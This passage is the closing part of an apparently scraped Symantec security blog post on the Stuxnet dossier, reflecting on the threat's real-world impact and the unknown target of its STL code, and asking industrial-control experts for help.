maintain the command and control server. When looking through our archive, we were able to find a sample from June 2009. Therefore the attackers had been active for at least a year. We would not be surprised if they started even prior to that. Typical threats attack virtual or individual assets like credit card numbers. The real-world implications of Stuxnet are beyond any threat we have seen in the past and despite the exciting challenge in reverse engineering Stuxnet and understanding its purpose, Stuxnet is the type of threat we hope to never see again. In addition, we want to acknowledge the entire Symantec Security Response Team. Analyzing Stuxnet was a huge effort that involved many individuals who worked tirelessly to uncover Stuxnet’s ultimate motivation. Without each individual’s contribution, our exclusive analysis would have not been possible. Finally, while we believe we have uncovered all the major and even minor details of Stuxnet, the ultimate target of Stuxnet remains unknown. We have reversed and extracted all the STL code used, but the STL code does not provide any context of what it is controlling in the real world. For those that aren’t familiar with ICS systems, essentially the STL code will set a certain address to a number. But what is behind that address – a pump, a centrifuge, a conveyor belt – cannot be seen from the code. However, we suspect there might be some common constructs, such as certain values you’d only see when activating a centrifuge versus a pump used in STL coding that might give more clues to the target. Therefore if you are a verifiable expert in STL coding that has worked in multiple critical infrastructure industries and coded large STL programs for large industrial control systems in those multiple industries and wish to help, please contact me. You can click on my name at the top to send me a private message. Here is the link again to our comprehensive paper:W32.Stuxnet Dossier. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/stuxnet-dossier-espionage"
  }
]